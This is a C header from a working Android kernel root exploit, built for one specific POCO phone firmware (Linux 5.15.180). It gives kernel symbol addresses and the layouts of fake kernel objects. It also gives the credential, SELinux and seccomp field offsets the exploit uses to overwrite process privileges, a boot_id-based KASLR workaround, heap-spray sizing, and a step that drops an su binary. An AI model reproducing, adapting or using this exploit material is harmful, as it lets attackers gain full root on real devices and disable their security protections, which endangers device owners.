/*
 * TARGET: air-AP3A.240905.015.A2   (POCO air; fingerprint from Target/Target Info)
 *
 * Kernel: Linux 5.15.180-android13-8-00021-g46a5565a0982-ab13743836 (built Jul 7 2025)
 * KIMAGE_TEXT_BASE = _text = 0xffffffc008000000 (from symbols.txt).
 *
 * STATUS: offsets below are RESOLVED for this exact 5.15.180 GKI build:
 *   - Symbol offsets (*_OFF / SLIDE_*_OFF): computed from kernel_5-15-180-symbols.txt
 *     (addr - _text). Verified: nfulnl_logger, loggers, sysctl_bootid.
 *   - Memory-layout constants (PAGE_OFFSET etc.): 39-bit-VA GKI values, correct.
 *   - ALL struct field offsets + FAKE_ and CFG_ exploit-internal constants: derived
 *     from pahole on the GKI debug vmlinux (gki_debugkernel_5-15-180-vmlinux.elf).
 *
 * KEY 5.15.180 GKI divergences vs the 6.x reference targets:
 *   - file_operations has a backported `fop_flags` at 0x08, shifting every
 *     function-pointer offset by +8 (llseek 0x10, read 0x18, ... ioctl 0x50, ...).
 *   - task_struct is larger (sched_ext backport); task/cred/pi_* offsets all moved.
 *   - rt_mutex_waiter uses rt_waiter_node substructs (tree/pi_tree); the FAKE_WAITER_*
 *     layout matches this kernel exactly (verified via pahole).
 *   - copy_splice_read() does not exist in 5.15; ashmem_fops.splice_read is NULL,
 *     so COPY_SPLICE_READ is set to generic_file_splice_read (verified symbol).
 *   - selinux_enforcing is not a symbol; enforcing is selinux_state.enforcing (u8)
 *     at offset 0, so SELINUX_ENFORCING_OFF = selinux_state offset (0x02a9d78).
 *   - SLIDE_RANDOM_BOOT_ID_DATA (boot_id uuid buffer) is not a symbol; it is
 *     resolved at runtime by slide.c (reads sysctl_bootid + 8), and the
 *     kernel base is known from symbols (SLIDE_KERNEL_BASE_KNOWN), so the
 *     boot_id self-leak KASLR workaround is bypassed.
 */

#ifndef OFFSET_H
#define OFFSET_H

#define BUILD_VARIANT_LABEL "air_ap3a_240905_015_a2_truephone"  /* POCO air, AP3A.240905.015.A2 */
#define BUILD_FINGERPRINT "POCO/air_p_in/air:15/AP3A.240905.015.A2/OS2.0.206.0.VGQINXM:user/release-keys"

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)  /* POCO: 0 */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ===== Symbol offsets (addr - _text), from kernel_5-15-180-symbols.txt ===== */
#define ASHMEM_FOPS_OFF 0x021027c8ULL
#define ASHMEM_IOCTL_OFF 0x0113dc10ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0113e2c0ULL
#define ASHMEM_MMAP_OFF 0x0113e320ULL
#define ASHMEM_OPEN_OFF 0x0113e610ULL
#define ASHMEM_RELEASE_OFF 0x0113e6b0ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x0113e7d4ULL
#define CONFIGFS_READ_ITER_OFF 0x00676230ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00676d54ULL
#define COPY_SPLICE_READ_OFF 0x005c3ba4ULL   /* generic_file_splice_read (5.15) */
#define NOOP_LLSEEK_OFF 0x0055126cULL
#define INIT_TASK_OFF 0x02c43640ULL
#define ROOT_TASK_GROUP_OFF 0x02d57ac0ULL
#define SELINUX_BLOB_SIZES_OFF 0x02163c68ULL
#define SECURITY_HOOK_HEADS_OFF 0x021617e0ULL
#define KMALLOC_CACHES_OFF 0x02164a60ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01f85130ULL

/* 5.15 ashmem registers its miscdevice with .fops = &ashmem_fops, so there is
 * no separate ashmem_miscdev.fops symbol like on 6.x. ASHMEM_MISC_FOPS is unused. */
#define ASHMEM_MISC_FOPS_OFF ASHMEM_FOPS_OFF  /* 5.15: miscdevice.fops == &ashmem_fops */

#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ===== Slide-relative symbol offsets (addr - _text) ===== */
#define SLIDE_NFULNL_LOGGER_OFF 0x02b01e28ULL   /* nfulnl_logger */
#define SLIDE_LOGGERS_0_1_OFF 0x02b01d50ULL     /* loggers (nf_loggers array) */
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02dc5819ULL   /* sysctl_bootid (ctl_table) */
/* random_table[] (drivers/char/random.c) serves /proc/sys/kernel/random/boot_id.
 * Its entries are BSS (populated at runtime by register_sysctl), so the boot_id
 * entry's .data field address is resolved at runtime by slide.c
 * (resolve_boot_id_data scans random_table for the "boot_id" procname). */
#define SLIDE_RANDOM_TABLE_OFF 0x0ac37238ULL     /* random_table[] base */
/* 5.15.180 GKI: exact kernel base is known from symbols (KIMAGE_TEXT_BASE),
 * so the boot_id self-leak KASLR workaround is bypassed. The boot_id buffer
 * address is still resolved at runtime by slide.c (resolve_boot_id_data) for
 * the SLIDE write path. */
#define SLIDE_KERNEL_BASE_KNOWN 1

/* Minimal, non-destructive install: do NOT mount tmpfs over /apex, do NOT
 * install an adb-visible su. Only drop the su
 * binary to /data/local/tmp/su (SU_LOCAL) and run its daemon from there.
 * Kernel-side root (cred/selinux) is in-memory and reverts on reboot. */
#define MINIMAL_INSTALL 1

/* ===== SLIDE_RANDOM_BOOT_ID_DATA =====
 * The 16-byte boot_id uuid buffer is not exported as a symbol. On this
 * 5.15.180 GKI build the boot_id entry sits at index 2 of
 * random_table[] (verified on-device, exlog5: "boot_id entry 2
 * field=ffffff8002dc5a19"). image offset = SLIDE_RANDOM_TABLE_OFF
 * (0xac37238) + 2*sizeof(struct ctl_table)(0x40) +
 * offsetof(struct ctl_table, data)(8) = 0x2dc5a19. This is the
 * .data field of the boot_id ctl_table -- the pointer to the uuid
 * buffer that /proc/sys/kernel/random/boot_id serves. The pselect
 * corruption overwrites it so the leak reads back a kernel pointer.
 * Hardcoded (per reference tokay target style); no runtime scan. */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02dc5a19ULL

#define SLIDE_NFULNL_LOGGER_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ===== Exploit-internal fake-object layout (kernel-version independent) ===== */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* ===== FAKE_WAITER_* : offsets within the fake rt_mutex_waiter (W0_OFF) =====
 * MANUALLY DERIVED from kernel_5-15-180-vmlinux.elf disassembly of
 * task_blocks_on_rt_mutex() (stp x20,x19,[x21,#0x30] => task@0x30/lock@0x38;
 * tree_entry rb_node at [x21]/[x21,#0x8]/[x21,#0x10] => 0x0..0x18;
 * pi_tree_entry is the only gap 0x18..0x30). This is the COMPACT 5.15.180
 * production layout — NOT the rt_waiter_node.prio variant the debug-kernel
 * pahole produced. Real field offsets CONFIRMED via disassembly (2026-08-07):
 * wake_state@0x40, prio@0x44, deadline@0x48, ww_ctx@0x50. See
 * Target/waiter_field_offsets_5-15-180.md. */
#define FAKE_WAITER_TREE_ENTRY_OFF 0x00     /* rb_node: 0x00,0x08,0x10 */
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18  /* rb_node: 0x18,0x20,0x28 */
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
/* CONFIRMED via disassembly of task_blocks_on_rt_mutex / rt_mutex_adjust_prio_chain
 * (kernel_5-15-180-vmlinux.elf, 2026-08-07): compact rt_mutex_waiter layout is
 * wake_state@0x40, prio@0x44, deadline@0x48, ww_ctx@0x50 (single prio/deadline,
 * NOT the legacy tree/pi_tree split). TREE_PRIO/PI_TREE_PRIO both map to prio@0x44;
 * TREE_DEADLINE/PI_TREE_DEADLINE both map to deadline@0x48. See
 * Target/waiter_field_offsets_5-15-180.md. */
#define FAKE_WAITER_TREE_PRIO_OFF 0x44      /* prio (compact single field) */
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48  /* deadline */
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x44   /* prio (compact single field) */
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48 /* deadline */
#define FAKE_WAITER_WAKE_STATE_OFF 0x40     /* wake_state */
#define FAKE_WAITER_WW_CTX_OFF 0x50         /* ww_ctx */

/* ===== SIGRETURN signal-frame STAMP offsets =====
 * When the waiter thread takes a signal, the kernel saves its FPSIMD/SVE
 * registers into a sigframe on the kernel stack. The sigreturn writer copies
 * the fake waiter into fpsimd->vregs at these offsets; rt_sigreturn then
 * reloads those vregs back onto the kernel stack, placing the fake waiter
 * where the dangling rt_mutex_waiter lives. Offsets are per-SVE-state and
 * STABLE (not per-boot frame-depth guesses), unlike the mcast WAITER_OFF.
 * Values below mirror the RMG S918B/5.15.189 reference; validate on POCO
 * 5.15.180 via the SIGRETURN_PROBE gate (panic x27 = LOCK_MARKER proves
 * placement). Overridable via SIGRETURN_FPSIMD_OFF / SIGRETURN_SVE_OFF. */
#ifndef SIGRETURN_FPSIMD_WAITER_OFF
#define SIGRETURN_FPSIMD_WAITER_OFF 0x18   /* no SVE: waiter at fpsimd+0x18 */
#endif
#ifndef SIGRETURN_SVE_WAITER_OFF
#define SIGRETURN_SVE_WAITER_OFF 0x28      /* SVE active: waiter at fpsimd+0x28 */
#endif

/* ===== FAKE_TASK_* : offsets within the fake task_struct (FAKE_TASK_OFF) =====
 * MANUALLY DERIVED from kernel_5-15-180-vmlinux.elf disassembly:
 *   - usage @0x44c : get_task_struct does str w8,[x0,#0x44c] (atomic_inc)
 *   - prio  @0x7c  : task_blocks_on_rt_mutex compares task->0x7c against 0x63(99)
 *   - normal_prio @0x80 : next to prio
 *   - pi_lock @0x884 : rt_mutex_adjust_prio_chain does ldar/casa on task+0x884
 *   - pi_waiters @0x898 : rb_root base (task+0x898 / task+0x8a0 reads)
 *   - pi_blocked_on @0x8a0 : store of waiter ptr (task->pi_blocked_on = waiter)
 *   - pi_top_task @0x8b0 : load of task ptr (task->pi_top_task)
 * (task_struct->real_cred @0x790 / cred @0x798, see below.) */
#define FAKE_TASK_USAGE_OFF 0x44c         /* usage (refcount) */
#define FAKE_TASK_PRIO_OFF 0x7C           /* prio */
#define FAKE_TASK_NORMAL_PRIO_OFF 0x80    /* normal_prio */
#define FAKE_TASK_TASK_GROUP_OFF 0x400    /* sched_task_group (CORRECTED from 0x410; BTF/wake_up_new_task confirm 0x400) */
#define FAKE_TASK_PI_LOCK_OFF 0x884       /* pi_lock */
#define FAKE_TASK_PI_WAITERS_OFF 0x898    /* pi_waiters */
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8b0   /* pi_top_task */
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8a0 /* pi_blocked_on */

/* ===== CFG_* : offsets within struct configfs_buffer =====
 * Verified against production kernel disassembly:
 *   page@0x10 (16) : ldr x1,[x24,#0x10] in configfs_read_iter
 *   needs_read_fill@0x50 (80) : ldr w8,[x24,#0x50] / str wzr,[x24,#0x50]
 *   item@0x68 (104) : ldr x0,[x24,#0x68] in configfs_read_iter
 *   bin_buffer@0x58 (88) : str x0,[x25,#0x58] in configfs_bin_read_iter
 *   bin_buffer_size@0x60 (96) : str w23,[x25,#0x60] in configfs_bin_read_iter
 *   cb_max_size@0x64 (100) : ldrsw x8,[x25,#0x64] in configfs_bin_read_iter */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* ===== task_struct field offsets =====
 * MANUALLY DERIVED from kernel_5-15-180-vmlinux.elf disassembly + BTF:
 *   - real_cred @0x790 / cred @0x798 : confirmed in get_task_cred
 *     (add x10,x0,#0x790; ldar x19,[x10]), commit_creds
 *     (ldr x19,[x20,#0x790]; ldr x8,[x20,#0x798]) and prepare_kernel_cred
 *     (add x10,x21,#0x790; ldar x19,[x10]). All three agree.
 *   - mm @0x520 : get_task_mm does ldr x20,[x21,#0x520]
 *   - normal_prio @0x80 : set_user_nice does ldr w9,[x19,#0x80]
 *   - comm @0x7a8 : __get_task_comm does add x1,x20,#0x7a8
 *   - real_parent @0x5e8 : do_task_stat does ldr x8,[x21,#0x5e8]
 *   - tasks @0xa68 : copy_process initializes list_head at 0xa68/0xa70
 *   - pid/tgid : NOT direct fields; accessed via thread_pid at task+0x7f0
 *     (get_task_pid / __task_pid_nr_ns use task->thread_pid + pid struct)
 *   - seccomp @0x860 : CONFIRMED via do_seccomp (ldr w8,[x21,#0x860]) and
 *     seccomp_assign_mode (str w8,[x0,#0x860]) disassembly
 *   - atomic_flags @0x598 : CONFIRMED via do_seccomp (ldr x8,[x21,#0x598])
 *   - sched_task_group @0x400 : BTF + wake_up_new_task clue (0x400) */
#define MM_OWNER_OFF 0x520               /* mm (CORRECTED from 0xAB8; disasm+BTF agree) */
#define TASK_PID_OFF 0x7f0               /* thread_pid (struct pid *) — NOT a direct int field */
#define TASK_TGID_OFF 0x7f0              /* same thread_pid struct; pid/tgid accessed via pid namespace */
#define TASK_REAL_PARENT_OFF 0x5e8       /* real_parent (CORRECTED from 0xB40; do_task_stat confirms) */
#define TASK_ATOMIC_FLAGS_OFF 0x598      /* atomic_flags (CONFIRMED via do_seccomp disassembly) */
#define TASK_REAL_CRED_OFF 0x790         /* real_cred */
#define TASK_CRED_OFF 0x798              /* cred */
#define TASK_COMM_OFF 0x7a8              /* comm[16] (CORRECTED from 0xD48; __get_task_comm confirms) */
#define TASK_TASKS_OFF 0xa68             /* tasks (list_head) (confirmed via copy_process) */
#define TASK_THREAD_INFO_FLAGS_OFF 0x00  /* thread_info.flags */
#define TASK_SECCOMP_OFF 0x860           /* seccomp (CONFIRMED via do_seccomp + seccomp_assign_mode disassembly) */

/* ===== cred field offsets =====
 * MANUALLY DERIVED from kernel_5-15-180-vmlinux.elf disassembly:
 *   - uid @0x4 : __sys_setresuid does str w23,[x22,#0x4] (new->uid)
 *   - suid @0xc, euid @0x14, fsuid @0x1c from same function
 *   - gid @0x8 / sgid @0x10 / egid @0x18 / fsgid @0x20 by symmetric layout
 *   - securebits @0x24 : 4-byte gap before cap_inheritable
 *   - cap_inheritable @0x28, cap_permitted @0x30, cap_effective @0x38,
 *     cap_bset @0x40, cap_ambient @0x48 : cap_capset writes
 *     (str x8,[x0,#0x28] inh; str x9,[x0,#0x30] perm; str x10,[x0,#0x38] eff;
 *      str x10,[x0,#0x48] ambient) and reads old->cap_bset at #0x40.
 *   - security @0x78 (120) : CONFIRMED via selinux_cred_prepare
 *     (ldr x10,[x1,#0x78] new cred; ldr x8,[x8,#0x78] old cred) */
#define CRED_UID_OFF 4
#define CRED_SECUREBITS_OFF 0x24
#define CRED_CAPS_OFF 0x28               /* cap_inheritable */
#define CRED_CAP_PERMITTED_OFF 0x30
#define CRED_CAP_EFFECTIVE_OFF 0x38
#define CRED_CAP_BSET_OFF 0x40
#define CRED_CAP_AMBIENT_OFF 0x48
#define CRED_SECURITY_OFF 120
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4

/* ===== seccomp field offsets =====
 * Derived from pahole -C seccomp on the 5.15.180 GKI debug vmlinux
 * (identical to reference). */
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

/* ===== struct page offsets =====
 * Derived from pahole -C page on the 5.15.180 GKI debug vmlinux
 * (identical to reference). */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

/* ===== pipe_buffer offsets =====
 * Derived from pahole -C pipe_buffer on the 5.15.180 GKI debug vmlinux
 * (identical to reference). */
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ===== file_operations offsets =====
 * Verified via production kernel disassembly where noted.
 * Disassembly confirmations:
 *   - ioctl@0x50 : __arm64_sys_ioctl loads fops->ioctl at #0x50
 *   - open@0x70 : do_dentry_open loads fops->open at #0x70
 *   - release@0x78 : filp_close loads fops->release at #0x78
 *   - splice_read@0xc8 : fops_u8_ro+0xc8 references in disassembly
 *   - show_fdinfo@0xd8 : trace_options_core_fops+0xd8 refs */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x10
#define FOPS_READ_OFF 0x18
#define FOPS_WRITE_OFF 0x20
#define FOPS_READ_ITER_OFF 0x28
#define FOPS_WRITE_ITER_OFF 0x30
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xC8
#define FOPS_SHOW_FDINFO_OFF 0xD8

/* ===== selinux_state.enforcing =====
 * 5.15 has no selinux_enforcing symbol; enforcing is selinux_state.enforcing
 * (u8) at offset 0 within struct selinux_state. selinux_state symbol offset
 * (addr - _text) = 0x02a9d78. */
#define SELINUX_ENFORCING_OFF 0x02a9d78ULL
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)

/* ===== kmalloc_caches[] layout for this 5.15.180 GKI build =====
 * Derived from embedded config: SLUB, CONFIG_MEMCG_KMEM=y,
 * CONFIG_ARM64_4K_PAGES (PAGE_SHIFT=12), CONFIG_FORCE_MAX_ZONEORDER=11.
 * In 5.15 slab.h: KMALLOC_SHIFT_HIGH = min(MAX_ORDER+PAGE_SHIFT-1, 25) = 22,
 * so buckets = 23. kmalloc_cache_type enum (5.15): NORMAL=0, CGROUP=1
 * (KMALLOC_RECLAIM type only exists from 5.17+, so NR_KMALLOC_TYPES=2).
 * Pipe ring buffers are allocated with GFP_KERNEL_ACCOUNT -> cgroup cache.
 * KMALLOC_PIPE_INDEX=11 / KMALLOC_PIPE_OBJ_SIZE=0x800 (2KB) is version-stable.
 * NOTE: validate KMALLOC_CGROUP_TYPE on-device by confirming the slot named
 * "kmalloc-2k" with the account flag is the cgroup cache. */
#ifndef KMALLOC_SHIFT_HIGH
#define KMALLOC_SHIFT_HIGH 22
#endif
#ifndef KMALLOC_CGROUP_TYPE
#define KMALLOC_CGROUP_TYPE 1
#endif
#ifndef KMALLOC_CACHE_TYPES
#define KMALLOC_CACHE_TYPES 2
#endif
/* mm_struct is 0x3e0 (992) on 5.15.180 GKI -> lives in the kmalloc-1k cache.
 * MM_STRUCT_SZ must map to the same cache as the real mm_struct so the fake-mm
 * spray shares its slab; 0x400 (1024) is the kmalloc-1k size. The 6.x default
 * 0x500 (1280) would land in kmalloc-2k and never overlap the real mm_struct. */
#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x400
#endif

#endif
